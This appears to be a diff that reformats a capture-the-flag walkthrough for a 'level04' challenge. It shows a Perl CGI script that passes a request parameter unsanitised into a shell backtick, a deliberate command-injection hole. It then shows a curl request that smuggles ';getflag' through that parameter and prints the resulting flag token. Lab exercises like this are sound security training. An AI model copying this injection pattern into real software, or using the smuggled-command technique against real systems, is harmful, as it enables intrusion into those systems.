@@ -1,15 +1,16 @@
-ls
->level04.pl
+>ls
+    level04.pl
 
-cat level04.pl
->#!/usr/bin/perl
-># localhost:4747
->use CGI qw{param};
->print "Content-type: text/html\n\n";
->sub x {
->  $y = $_[0];
->  print `echo $y 2>&1`;
->}
->x(param("x"));
+>cat level04.pl
+    #!/usr/bin/perl
+    # localhost:4747
+    use CGI qw{param};
+    print "Content-type: text/html\n\n";
+    sub x {
+      $y = $_[0];
+      print `echo $y 2>&1`;
+    }
+    x(param("x"));
 
-curl http://localhost:4747/level04.pl?x=%3Bgetflag
+>curl http://localhost:4747/level04.pl?x=%3Bgetflag
+    Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
